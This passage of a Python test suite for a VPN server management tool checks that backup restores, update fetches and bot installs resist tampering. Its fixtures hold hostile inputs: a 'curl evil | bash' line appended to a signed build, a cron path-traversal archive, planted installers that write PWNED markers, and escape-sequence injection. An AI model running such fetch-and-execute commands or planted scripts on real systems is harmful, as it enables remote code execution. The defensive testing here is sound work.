    r.get("ok") and "Команды убраны" in log and "pwned" in log and "--dport 2222" in srv
    and "pwned" not in srv and "SaveConfig" not in srv, [log[-600:], srv[:300]])
chk("архив туннелей не распаковывается в /: файл вне путей Тулзы не появился",
    not os.path.exists(os.path.join(ROOT, "etc/cron.d/evil")) and not os.path.exists("/etc/cron.d/evil"))
EXIT2 = os.path.join(AWGD, "awg-exit-n2.conf")
with open(EXIT2) as f:
    ex2 = f.read()
chk("exit-нода из бэкапа — без хуков, с Table = off", "PostUp" not in ex2 and "Table = off" in ex2
    and not os.path.exists(os.path.join(AWGD, "x.conf")), ex2)
with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf")) as f:
    rules = f.read()
chk("каскад из бэкапа — только с проверками добавления: публичная цель, порты, вход не занят, без дублей",
    rules == "udp|4443|5.6.7.8|443|ok\n" and "10.0.0.5" in log and "010.0.0.1" in log and "51820" in log, [rules, log[-900:]])
CRF, CRO = os.path.join(TMP, "cr-in"), os.path.join(TMP, "cr-out")
with open(CRF, "w", newline="") as f:
    f.write("udp|4443|5.6.7.8|443|a\r\nudp|4445|5.6.7.9|443\r\ntcp|4446|5.6.7.9|443|last")
rc, out, _ = bash(f'CASCADE_RULES="{CRO}"; write_file() {{ cat > "$1"; }}; _restore_cascade_rules "{CRF}" 2>&1; cat "{CRO}"')
chk("каскад из бэкапа: CRLF и последняя строка без перевода строки — не теряются",
    out.strip().splitlines()[-3:] == ["udp|4443|5.6.7.8|443|a", "udp|4445|5.6.7.9|443|", "tcp|4446|5.6.7.9|443|last"], out)
with open(os.path.join(ROOT, "etc/xray/config.json")) as f:
    xr = json.load(f)
chk("Xray из бэкапа: выходы и маршруты — да, чужие входы, API и журнал — нет",
    [o["tag"] for o in xr["outbounds"]] == ["proxy_a", "direct"] and xr["inbounds"] == []
    and "api" not in xr and "log" not in xr
    and xr["routing"]["rules"] == [{"inboundTag": ["socks-in"], "outboundTag": "proxy_a"}]
    and "Из конфига Xray бэкапа убрано" in log and "api-in" in log, [xr, log[-600:]])
# Чужой тег своего входа tun и кривые записи: главное правило не теряется
XRC = os.path.join(TMP, "xrc.json")
with open(XRC, "w") as f:
    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun"}, {"protocol": "socks", "tag": "evil\u001b[2J"}, "x", ["y"],
                            {"protocol": "socks", "tag": ["list"]}],
               "outbounds": [{"protocol": "vless", "tag": "a"}, {"protocol": "vless", "tag": "b"},
                             {"protocol": "freedom", "tag": "direct"}, {"protocol": "vless", "tag": ["z"]}],
               "routing": {"balancers": "oops", "rules": [
                   {"inboundTag": ["tun"], "outboundTag": "b"}, {"inboundTag": [["x"]], "outboundTag": "a"},
                   {"outboundTag": ["a"]}, "junk"]}}, f)
rc, out, err = bash(f'py xray-restore-clean "{XRC}" && py xray-prepare "{XRC}" native && py xray-main-get "{XRC}"')
xc = json.load(open(XRC))
chk("Xray из бэкапа: правило своего tun с чужим тегом сохраняется (выход b), кривые записи — убраны без падения",
    rc == 0 and out.strip().splitlines()[-1] == "b" and "\x1b" not in out and "Traceback" not in err
    and [r for r in xc["routing"]["rules"] if r.get("inboundTag")] == [{"inboundTag": ["tun-in"], "outboundTag": "b"}],
    [out, err[-300:], xc["routing"]])
chk("адрес tun2socks не по формату не восстановлен", not os.path.exists(os.path.join(ROOT, "etc/tun2socks/proxy.txt")))
with open(os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")) as f:
    toml = f.read()
chk("dnscrypt-proxy — шаблон Тулзы, из бэкапа только резолверы",
    "AWG Toolza" in toml and "server_names = ['quad9-doh-ip4-port443-nofilter-pri']" in toml
    and "query_log" not in toml and "cron" not in toml, toml)
chk("WARP: данные аккаунта — да, скрипт автозапуска из бэкапа — нет",
    os.path.exists(os.path.join(ROOT, "etc/wgcf/wgcf-account.toml"))
    and not os.path.exists(os.path.join(ROOT, "etc/wgcf/warp-autostart.sh")))
chk("ничего из бэкапа не выполнилось", not os.path.exists(os.path.join(TMP, "pwned")))

print("Сертификат")
fake_acme()
CERT = os.path.join(ROOT, "etc/awg2/cert/fullchain.pem")
r = api("cert")
chk("cert status: сертификата нет, IP сервера известен",
    r.get("ok") and r["data"]["installed"] is False and r["data"]["ip"] == "203.0.113.10", r)
reset_calls()
r = api("cert", "issue", "ip")
c = calls()
chk("сертификат на IP: Let's Encrypt, http-01 на 80-м порту, профиль shortlived, продление через 3 дня",
    r.get("ok") and "--issue --server letsencrypt -d 203.0.113.10 --standalone --httpport 80" in c
    and "--cert-profile shortlived --days 3" in c, [r.get("log"), c[-500:]])
st = api("cert", "status").get("data") or {}
chk("сертификат на месте, срок читается",
    st.get("installed") and st.get("kind") == "ip" and st.get("name") == "203.0.113.10"
    and (st.get("expires") or 0) > time.time() + 5 * 86400 and oct(os.stat(CERT.replace("fullchain", "key")).st_mode)[-3:] == "600", st)
with open(os.path.join(ROOT, "units", "awg2-cert.service")) as f:
    unit = f.read()
chk("таймер продления: acme.sh --cron со своим каталогом",
    "--cron --home" in unit and os.path.exists(os.path.join(ROOT, "units", "awg2-cert.timer")), unit)
r = api("cert", "issue", "ip")
chk("повторный выпуск: acme.sh ответил «рано продлевать» — не ошибка", r.get("ok"), r)
r = api("cert", "issue", "domain", "bad_domain")
chk("домен проверяется", not r.get("ok") and "домен" in (r.get("error") or ""), r)
r = api("cert", "issue", "domain", "nothing.invalid")
chk("домен без A-записи — понятная ошибка", not r.get("ok") and "не резолвится" in (r.get("error") or ""), r)

with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11\n')
r = api("bot", "webapp", "get")
chk("Mini App: порт по умолчанию 8443, адрес по сертификату",
    r.get("ok") and r["data"] == {"port": "8443", "url": "https://203.0.113.10:8443/"}, r)
r = api("bot", "webapp", "port", "80")
chk("порт 80 под Mini App не отдаётся — он для сертификата", not r.get("ok"), r)
r = api("bot", "webapp", "port", "443")
chk("порт 443 — адрес без номера порта",
    r.get("ok") and api("bot", "webapp", "get")["data"]["url"] == "https://203.0.113.10/", r)
with open(os.path.join(ROOT, "bot.conf")) as f:
    chk("порт записан в конфиг бота, токен не тронут", "WEBAPP_PORT=443" in f.read())
os.remove(os.path.join(ROOT, "bot.conf"))

reset_calls()
r = api("cert", "remove")
chk("удаление: acme.sh забывает адрес, файлы и таймер убраны",
    r.get("ok") and not os.path.exists(CERT) and "--remove -d 203.0.113.10" in calls()
    and not os.path.exists(os.path.join(ROOT, "var/lib/awg2/cert")), [r, calls()[-300:]])

# Готовый сертификат сервера (порт 80 занят Caddy): тестовый CA и сертификат
# на IP сервера в каталоге Caddy, рядом — самоподписанный и с чужим ключом
print("Готовые сертификаты")
CA = os.path.join(TMP, "ca")
CADDY = os.path.join(ROOT, "var/lib/caddy/.local/share/caddy/certificates/acme/203.0.113.10")
SELF = os.path.join(ROOT, "etc/letsencrypt/live/self")
BADK = os.path.join(ROOT, "root/cert/bad")
for d in (CA, CADDY, SELF, BADK):
    os.makedirs(d, exist_ok=True)
EC = ["-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:P-256", "-nodes"]
def ossl(*a):
    subprocess.run(["openssl", *a], check=True, capture_output=True, cwd=CA)
ossl("req", "-x509", *EC, "-keyout", "ca.key", "-out", "ca.crt", "-days", "30", "-subj", "/CN=Test CA")
ossl("req", *EC, "-keyout", f"{CADDY}/203.0.113.10.key", "-out", "leaf.csr", "-subj", "/CN=203.0.113.10")
with open(os.path.join(CA, "ext"), "w") as f:
    f.write("subjectAltName=IP:203.0.113.10\n")
ossl("x509", "-req", "-in", "leaf.csr", "-CA", "ca.crt", "-CAkey", "ca.key", "-CAcreateserial",
     "-out", f"{CADDY}/203.0.113.10.crt", "-days", "20", "-extfile", "ext")
ossl("req", "-x509", *EC, "-keyout", f"{SELF}/privkey.pem", "-out", f"{SELF}/fullchain.pem", "-days", "20",
     "-subj", "/CN=203.0.113.10", "-addext", "subjectAltName=IP:203.0.113.10")
shutil.copy(f"{CADDY}/203.0.113.10.crt", f"{BADK}/fullchain.pem")
ossl("genpkey", "-algorithm", "EC", "-pkeyopt", "ec_paramgen_curve:P-256", "-out", f"{BADK}/privkey.pem")
CADDY_CRT = f"{CADDY}/203.0.113.10.crt"
r = api("cert", "find")
rows = r.get("data") or []
chk("находит сертификат Caddy, самоподписанный и с чужим ключом — мимо",
    r.get("ok") and [(x["name"], x["source"], x["cert"]) for x in rows] == [("203.0.113.10", "Caddy", CADDY_CRT)], r)
r = api("cert", "use", "/etc/passwd")
chk("подключается только найденный, не любой путь", not r.get("ok") and "нет" in (r.get("error") or ""), r)
r = api("cert", "use", CADDY_CRT)
st = api("cert", "status").get("data") or {}
chk("готовый подключён ссылкой, продлевает Caddy", r.get("ok") and os.path.islink(CERT)
    and os.path.realpath(CERT) == os.path.realpath(CADDY_CRT) and st.get("kind") == "external"
    and st.get("source") == "Caddy" and st.get("installed") and st.get("name") == "203.0.113.10"
    and not os.path.exists(os.path.join(ROOT, "units", "awg2-cert.timer.disabled")), [r, st])
r = api("cert", "remove")
chk("удаление готового: свои ссылки убраны, файлы Caddy целы", r.get("ok") and not os.path.lexists(CERT)
    and os.path.exists(CADDY_CRT) and os.path.exists(f"{CADDY}/203.0.113.10.key"), r)

BUSY = os.path.join(TMP, "busy80")
os.makedirs(BUSY, exist_ok=True)
with open(os.path.join(BUSY, "ss"), "w") as f:
    f.write('#!/usr/bin/env bash\n[[ "$*" == *":80"* ]] && echo \'LISTEN 0 4096 *:80 *:* users:(("caddy",pid=1,fd=3))\'\nexit 0\n')
os.chmod(os.path.join(BUSY, "ss"), 0o755)
r = api("cert", "issue", "ip", env={"PATH": BUSY + ":" + ENV["PATH"]})
chk("порт 80 занят — отказ с подсказкой про готовый сертификат", not r.get("ok") and "занят (caddy)" in (r.get("error") or "")
    and "готовые сертификаты (1)" in r.get("log", ""), r)
st = api("cert", "status", env={"PATH": BUSY + ":" + ENV["PATH"]}).get("data") or {}
chk("статус: кто держит порт 80 и сколько готовых", st.get("port80") == "caddy" and st.get("found") == 1, st)

print("Список изменений")
MD = ("# Изменения\n\n---\n\n## v1.2.0 — 2026-11-01\n\n- новое **важное**\n  продолжение\n\n---\n\n"
      "## v1.1.1 — 2026-10-01\n\n- исправление\n\n---\n\n## v1.1.0 — 2026-10-01 (бот 3.1.0)\n\n- панель\n")
rc, out, _ = bash("py changelog-json v1.1.0", stdin=MD)
d = json.loads(out) if rc == 0 else {}
chk("изменения новее установленной, сверху новейшая", d.get("newer") is True
    and [x["version"] for x in d.get("sections", [])] == ["v1.2.0", "v1.1.1"]
    and d["sections"][0]["title"] == "2026-11-01" and d["sections"][0]["body"].endswith("продолжение"), d)
rc, out, _ = bash("py changelog-json v1.2.0", stdin=MD)
d = json.loads(out) if rc == 0 else {}
chk("новее нет — раздел текущей версии", d.get("newer") is False
    and [x["version"] for x in d.get("sections", [])] == ["v1.2.0"], d)
r = api("update", "changelog")
chk("нет связи с GitHub — понятная ошибка", not r.get("ok") and "недоступен" in (r.get("error") or ""), r)
# Кэш проверки отстал (живёт до часа), а в CHANGELOG канала уже новее — «Доступна»
# и кнопка в панели показали бы прошлую версию: awg2 спрашивает канал сразу
CLBIN = os.path.join(TMP, "clbin")
os.makedirs(CLBIN, exist_ok=True)
with open(os.path.join(CLBIN, "curl"), "w") as f:
    f.write('#!/usr/bin/env bash\nurl="${@: -1}"; echo "curl $url" >> "$CALLS"\ncase "$url" in\n'
            '  *CHANGELOG.md*) printf "# Изменения\\n\\n## v9.1.0 — 2026-11-01\\n\\n- новое\\n\\n## v9.0.0 — 2026-10-01\\n\\n- старое\\n" ;;\n'
            '  *awg2.sh*) printf "#!/bin/bash\\nVERSION=\\"v9.1.0\\"\\n" ;;\n  *) exit 22 ;;\nesac\n')
os.chmod(os.path.join(CLBIN, "curl"), 0o755)
for name in ("update_check", "update_check.beta"):
    with open(os.path.join(ROOT, "var/lib/awg2", name), "w") as f:
        f.write(f"v9.0.0 {int(time.time())}\n")
reset_calls()
r = api("update", "changelog", env={"PATH": CLBIN + ":" + ENV["PATH"]})
d = r.get("data") or {}
chk("кэш проверки отстал от CHANGELOG — канал спрошен сразу, «Доступна» — новейшая",
    r.get("ok") and d.get("available") == "v9.1.0" and d["sections"][0]["version"] == "v9.1.0"
    and "awg2.sh" in calls(), [r, calls()])
reset_calls()
r = api("update", "changelog", env={"PATH": CLBIN + ":" + ENV["PATH"]})
chk("кэш свежий — второй раз канал не спрашивается", r.get("ok") and (r.get("data") or {}).get("available") == "v9.1.0"
    and "awg2.sh" not in calls() and "CHANGELOG.md" in calls(), [r, calls()])
for name in ("update_check", "update_check.beta"):
    os.remove(os.path.join(ROOT, "var/lib/awg2", name))

print("Мимикрия как у сервера")
with open(conf, "w") as f:
    f.write(OLD20.replace("# AWG_MIMICRY=quic", "# AWG_MIMICRY=dns\n# AWG_MIMICRY_DOMAIN=example.com\n# AWG_OBF_LEVEL=2"))
def i_lines(name):
    t = (api("client", "conf", name).get("data") or {}).get("text", "")
    return sorted(set(re.findall(r"^(I[1-5]) =", t, re.M)))
api("client", "add", "m_srv", "mimicry=server")
api("client", "add", "m_srv3", "mimicry=server:3")
chk("«как у сервера» — уровень сервера (только I1)", i_lines("m_srv") == ["I1"], i_lines("m_srv"))
chk("«как у сервера» с уровнем 3 — цепочка того же профиля", i_lines("m_srv3") == ["I1", "I2", "I3", "I4", "I5"],
    i_lines("m_srv3"))

print("Ядро без модуля")
KG = ('MOD_SRC_DIR="$STATE_DIR/modsrc"; mkdir -p "$MOD_SRC_DIR"; dkms() { :; }; uname() { echo 6.8.0-100-generic; }; '
      'installed_kernels() { printf "%s\\n" 6.8.0-90-generic 6.8.0-100-generic 6.8.0-110-generic; }; '
      'mod_loaded() { true; }; ')
rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; kernel_gap; echo "--"; kernel_gap_line')
chk("новое ядро без модуля — в списке, старое — нет", out == "6.8.0-110-generic нет-заголовков\n--\n6.8.0-110-generic (нет заголовков)\n", out)
rc, out, _ = bash(KG + 'mod_built_for() { true; }; kernel_gap; echo "[$(kernel_gap_line)]"')
chk("модуль собран под все ядра — пусто", out == "[]\n", out)
rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; components_summary')
chk("шапка меню предупреждает о ядре без модуля", "6.8.0-110-generic" in out and "Пересобрать" in out, out)
rc, out, _ = bash(KG + 'mod_built_for() { false; }; mod_loaded() { false; }; components_summary')
chk("шапка: и работающее ядро без модуля не прячет более новое", "ядро 6.8.0-110-generic" in out
    and "6.8.0-100-generic," not in out, out)
chk("шапка: …и про работающее ядро без модуля тоже сказано", "работающее ядро 6.8.0-100-generic" in out, out)
rc, out, _ = bash(KG + 'uname() { echo 6.8.0-1; }; installed_kernels() { printf "%s\\n" 6.8.0-1 6.8.0-10; }; '
                  'mod_built_for() { [[ $1 == 6.8.0-1 ]]; }; components_summary')
chk("шапка: 6.8.0-10 без модуля при работающем 6.8.0-1 — не префикс", "ядро 6.8.0-10" in out, out)
r = api("status")
chk("api status: components.kernel_gap", r.get("ok") and "kernel_gap" in (r["data"].get("components") or {}), r.get("data"))
chk("api status: uptime — секунды работы системы", isinstance(r["data"].get("uptime"), int) and r["data"]["uptime"] > 0, r.get("data"))

print("Страна сервера — флаг в шапке панели")
rc, out, _ = bash('curl() { printf "fl=1\\nip=203.0.113.10\\nloc=NL\\nwarp=off\\n"; }; country_refresh; cat "$COUNTRY_CACHE"; server_country')
o = out.split()
chk("страна — из cloudflare cdn-cgi/trace (loc=), в кэш со временем", len(o) == 3 and o[0] == "NL" and o[1].isdigit() and o[2] == "NL", out)
r = api("status")
chk("api status: country — код страны из кэша", (r.get("data") or {}).get("country") == "NL", r.get("data"))
rc, out, _ = bash('rm -f "$COUNTRY_CACHE"; curl() { return 28; }; country_refresh; cat "$COUNTRY_CACHE"; echo "[$(server_country)]"')
chk("Cloudflare не ответил — пометка «-», страна пустая (флага нет)", out.split()[0] == "-" and out.strip().endswith("[]"), out)
# Один сбой не стирает уже известную страну (флаг не пропадает на час); метка такая, что повтор — через час
rc, out, _ = bash('echo "NL $(( $(date +%s) - 90000 ))" > "$COUNTRY_CACHE"; curl() { return 28; }; country_refresh; '
                  'read -r cc ts < "$COUNTRY_CACHE"; echo "$cc $(( $(date +%s) - ts )) [$(server_country)]"')
o = out.split()
chk("Cloudflare не ответил, а страна уже известна — остаётся, повтор через час (не через сутки)",
    len(o) == 3 and o[0] == "NL" and o[2] == "[NL]" and o[1].isdigit() and 82700 <= int(o[1]) <= 82900, out)
rc, out, _ = bash('rm -f "$COUNTRY_CACHE"; curl() { printf "loc=XX\\n"; }; country_refresh; echo "[$(server_country)]"; '
                  'printf "<b>\\n" > "$COUNTRY_CACHE"; echo "[$(server_country)]"')
chk("неизвестная страна (XX) и мусор в кэше — без флага", out.split() == ["[]", "[]"], out)
CR = 'country_refresh() { touch "$STATE_DIR/cr"; }; rm -f "$STATE_DIR/cr"; unset AWG_NO_UPDATE_CHECK; '
for cache, age, want, what in (("NL", 3600, False, "узнали час назад — не спрашивает"),
                               ("NL", 90000, True, "узнали больше суток назад — спрашивает"),
                               ("-", 600, False, "не узнали 10 мин назад — ждёт"),
                               ("-", 3700, True, "не узнали больше часа назад — спрашивает снова")):
    rc, out, _ = bash(CR + f'echo "{cache} $(( $(date +%s) - {age} ))" > "$COUNTRY_CACHE"; country_refresh_async; sleep 0.3; '
                      '[[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
    chk(f"страна: {what}", out.strip().endswith("ASK" if want else "SKIP"), out)
rc, out, err = bash(CR + 'rm -f "$COUNTRY_CACHE"; country_refresh_async; sleep 0.3; [[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
chk("страна: кэша ещё нет — спрашивает, без ошибок в stderr", out.strip().endswith("ASK") and not err.strip(), [out, err])
rc, out, _ = bash('AWG_NO_UPDATE_CHECK=1; country_refresh() { touch "$STATE_DIR/cr"; }; rm -f "$STATE_DIR/cr" "$COUNTRY_CACHE"; '
                  'country_refresh_async; sleep 0.3; [[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
chk("страна: в тестах и без сети (AWG_NO_UPDATE_CHECK) — не спрашивает", out.strip().endswith("SKIP"), out)

print("Домен мимикрии по региону")
STUBSCAN = 'scan_domains() { shift; SCAN_OK=("$@"); }; '
rc, out, _ = bash(STUBSCAN + 'SERVER_CONF=/nonexistent; S_REGION=world; MIMICRY=dns; mimicry_pool_domain >/dev/null; '
                  'echo "$CPS_DOMAIN"; printf "%s\\n" "${TLS_DOMAINS[@]}"')
lines = out.split()
chk("мастер, регион «мир» — домен из мировых сайтов", lines and lines[0] in lines[1:], out)
rc, out, _ = bash(STUBSCAN + 'SERVER_CONF=/nonexistent; S_REGION=ru; MIMICRY=dns; mimicry_pool_domain >/dev/null; '
                  'echo "$CPS_DOMAIN"; printf "%s\\n" "${CPS_DOMAINS[@]}"')
lines = out.split()
chk("мастер, регион «Россия» — домен из российских", lines and lines[0] in lines[1:], out)
rc, out, _ = bash(STUBSCAN + 'MIMICRY=dns; choose_cps_domain; echo "D=$CPS_DOMAIN"; printf "%s\\n" "${TLS_DOMAINS[@]}" "${CPS_DOMAINS[@]}"',
                  stdin="\n")
out = re.sub(r"\x1b\[[0-9;]*m", "", out)
dom = re.search(r"D=(\S+)", out)
chk("домен мимикрии: Enter — автоматически из пула", "1 Автоматически" in out and dom and dom.group(1) in out.split()[1:]
    and "Домен (Enter" not in out, out[-500:])
rc, out, _ = bash('MIMICRY=dns; choose_cps_domain; echo "D=$CPS_DOMAIN"', stdin="2\nexample.org\n")
chk("домен мимикрии: 2 — свой", "D=example.org" in out, out[-300:])
rc, out, _ = bash('_choose_mtu 1280; echo "M=$MTU"', stdin="\n")
chk("MTU: 1280 в списке один раз, Enter — рекомендуемый",
    len(re.findall(r"\) 1280", re.sub(r"\x1b\[[0-9;]*m", "", out))) == 1 and "M=1280" in out, out)
rc, out, _ = bash('_choose_mtu 1320; echo "M=$MTU"', stdin="4\n")
chk("MTU: другой рекомендуемый — первым, остальные по порядку", "M=1280" in out and "5)" in re.sub(r"\x1b\[[0-9;]*m", "", out), out)
rc, out, _ = bash('echo "$VERSION_SHOW"')
chk("версия без буквы у обычной сборки", out.strip() == bash('echo "$VERSION"')[1].strip(), out)

print("Подпись обновлений")
# Подпись проверяет ssh-keygen (openssh-client): без него раздел пропускается,
# а не роняет весь набор
if not shutil.which("ssh-keygen"):
    print("  ПРОПУСК: нет ssh-keygen — поставь openssh-client")
else:
    SIG = os.path.join(TMP, "sigsrv")
    SIGBIN = os.path.join(TMP, "sigbin")
    os.makedirs(SIG)
    os.makedirs(SIGBIN)
    # curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
    with open(os.path.join(SIGBIN, "curl"), "w") as f:
        f.write(r"""#!/usr/bin/env bash
    out="" url=""
    while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
    url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
    [[ -f "$src" ]] || exit 22
    if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
    """)
    os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
    PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
    SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '

    def build(ver, key="relkey", sign=True, tamper=False):
        body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
        path = os.path.join(SIG, "awg2.sh")
        with open(path, "w") as f:
            f.write(body)
        if os.path.exists(path + ".sig"):
            os.remove(path + ".sig")
        if sign:
            subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
        if tamper:
            with open(path, "a") as f:
                f.write("curl evil | bash\n")

    def fetch(extra="", auto=1):
        env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
        r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
                           input="", capture_output=True, text=True, env=env, timeout=120)
        return r.returncode, r.stdout

    build("v9.9.9")
    rc, out = fetch()
    chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
    build("v9.9.9", tamper=True)
    rc, out = fetch()
    chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
    build("v9.9.9", key="evilkey")
    rc, out = fetch()
    chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
    build("v9.9.9", sign=False)
    rc, out = fetch()
    chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
    build("v1.1.9", sign=False)
    rc, out = fetch()
    chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
    rc, out = fetch(auto=0)
    chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
    build("v9.9.9")
    rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
    chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
    rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
    chk("в сборку вшит ключ релизов", out.strip() == "1", out)

# Откат из бота и панели не ставится и с force: подпись не привязана к версии
OLDF = os.path.join(TMP, "old-awg2.sh")
with open(OLDF, "w") as f:
    f.write('#!/usr/bin/env bash\nVERSION="v1.0.0"\n')
TGT = os.path.join(TMP, "tgt-awg2")
with open(TGT, "w") as f:
    f.write("current\n")
def rollback(api_mode, force):
    rc, out, err = bash(f'SCRIPT_PATH="{TGT}"; VERSION=v1.2.2; UPDATE_NEW=v1.0.0; UPDATE_FILE="{OLDF}"; '
                        f'API_MODE={api_mode}; update_install {force} 2>&1; echo "rc=$?"')
    return out
out = rollback(1, "force")
chk("откат из API с force — отказ, файл не тронут", "rc=1" in out and "только из меню" in out
    and open(TGT).read() == "current\n", out)
out = rollback(0, "")
chk("откат из меню без force — отказ", "rc=1" in out and open(TGT).read() == "current\n", out)
out = rollback(0, "force")
chk("откат из меню с force (после yes) — ставится", "rc=0" in out and "v1.0.0" in open(TGT).read(), out)

print("\n── Код, который запускается от root, — только из каталогов root ──")
EVIL = os.path.join(TMP, "evil", "awg-toolza-v9")
os.makedirs(os.path.join(EVIL, "awg_bot", "awgbot"))
with open(os.path.join(EVIL, "awg_bot", "awgbot", "__init__.py"), "w") as f:
    f.write('__version__ = "99.0.0"\n')
open(os.path.join(EVIL, "awg_bot", "run.py"), "w").close()
with open(os.path.join(EVIL, "awg-bot-install.sh"), "w") as f:
    f.write("touch " + os.path.join(TMP, "PWNED_BOT") + "\n")
rc, out, _ = bash(f'root_only_path / && echo ROOT-OK; root_only_path "{TMP}" || echo TMP-NO; '
                  f'cd "{EVIL}" && echo "[$(_bot_local_src)]"')
chk("локальный код бота: каталог, куда может писать не только root, не берётся",
    "ROOT-OK" in out and "TMP-NO" in out and "[]" in out, out)
rc, out, _ = bash(f'cd "{EVIL}"; AUTO_MODE=1; BOT_INSTALL_URL=file:///nonexistent; bot_install >/dev/null 2>&1; '
                  f'[[ -e "{TMP}/PWNED_BOT" ]] && echo PWNED || echo SAFE')
chk("установка бота из API (без вопроса) не запускает чужой установщик", "SAFE" in out, out)
open(os.path.join(EVIL, "awg_bot", "awgbot", "web.py"), "w").close()
rc, out, _ = bash(f'cd "{EVIL}"; AUTO_MODE=1; BOT_INSTALL_URL=file:///nonexistent; web_code_install >/dev/null 2>&1; '
                  f'[[ -e "{TMP}/PWNED_BOT" ]] && echo PWNED || echo SAFE')
chk("код веб-панели не берётся из чужого каталога (там даже вопроса нет)", "SAFE" in out, out)
LINKED = os.path.join(TMP, "evil", "link-toolza")
os.symlink(EVIL, LINKED)
rc, out, _ = bash(f'BASH_ARGV0=/nonexistent/awg2; root_only_tree() {{ return 0; }}; root_only_path() {{ return 0; }}; '
                  f'cd "{LINKED}" && echo "[$(_bot_local_src)]"')
chk("локальный код бота — по настоящему пути, не через ссылку (её подменили бы после проверки)",
    f"[{os.path.realpath(EVIL)}/awg_bot]" in out and "link-toolza" not in out, out)
rc, out, _ = bash(f"""eval "$(sed -n '/^root_only() {{/,/^}}/p' "{HERE}/../awg-bot-install.sh")"; """
                  f'declare -F root_only >/dev/null || echo MISSING; root_only "{EVIL}/awg_bot" || echo NO; '
                  "root_only /tmp || echo TMP-NO; grep -cF 'root_only \"$SRC\"' \"" + HERE + "/../awg-bot-install.sh\"")
chk("установщик: awg_bot/ рядом с ним в /tmp или чужом каталоге не берётся", out.split() == ["NO", "TMP-NO", "1"], out)
rc, out, _ = bash("echo -e \"[$(shown $'a\\\\e[31mb\\e[0m\\nc')]\"")
chk("путь в вопросе — без управляющих символов и \\-последовательностей", out.strip() == "[a\\e[31mb?[0m?c]", repr(out))
FAKEBASH = os.path.join(TMP, "evil", "bash")
with open(FAKEBASH, "w") as f:
    f.write('#!/usr/bin/env bash\nVERSION="v9.9.9"\n')
r = subprocess.run(["bash", "-c", PRELUDE + f'SCRIPT_PATH="{TMP}/evil/awg2-target"; VERSION=v1.2.0; AUTO_MODE=1; '
                    'self_install_offer; echo rc=$?', "bash"], cwd=os.path.dirname(FAKEBASH),
                   input="", capture_output=True, text=True, env=ENV, timeout=60)
chk("запуск через curl | bash ($0 = bash): ./bash из текущего каталога не предлагается",
    "rc=0" in r.stdout and not os.path.exists(os.path.join(TMP, "evil", "awg2-target")), r.stdout + r.stderr)

print("\n── Запуск из распакованного архива ──")
INST = os.path.join(TMP, "inst")
os.makedirs(INST)
def selfcopy(build_letter, ver="v1.2.0"):
    path = os.path.join(INST, f"awg2-{ver}{build_letter}.sh")
    with open(path, "w") as f:
        f.write(f'#!/usr/bin/env bash\nVERSION="{ver}"\nBUILD="{build_letter}"\necho {ver}{build_letter}\n')
    return path

def offer(self_path, target, auto=1):
    code = (PRELUDE + f'SCRIPT_PATH="{target}"; VERSION=v1.2.0; BUILD=d; VERSION_SHOW=v1.2.0d; '
            f"AUTO_MODE={auto}; self_install_offer; echo rc=$?")
    r = subprocess.run(["bash", "-c", code, self_path], input="", capture_output=True, text=True, env=ENV, timeout=60)
    return r.stdout + r.stderr

new_d = selfcopy("d")
target = os.path.join(INST, "bin-awg2")
out = offer(new_d, target)
chk("команды awg2 нет — копия из архива ставится в SCRIPT_PATH",
    os.path.exists(target) and open(target).read() == open(new_d).read() and "rc=0" in out, out)
chk("установленная копия исполняемая", os.access(target, os.X_OK), oct(os.stat(target).st_mode))
out = offer(new_d, target)
chk("та же копия — без вопросов", "rc=0" in out and "Установить" not in out, out)
out = offer(target, target)
chk("запуск самой установленной копии — без вопросов", "Установить" not in out, out)
os.replace(selfcopy("c"), target)
out = offer(new_d, target)
chk("установлена v1.2.0c, запущена v1.2.0d — замена, прежняя в .bak",
    "v1.2.0c" in out and open(target).read() == open(new_d).read()
    and "v1.2.0c" in open(target + ".bak").read(), out)
os.replace(selfcopy("", ver="v9.9.9"), target)
out = offer(new_d, target)
chk("установлена более новая — без согласия не откатывается",
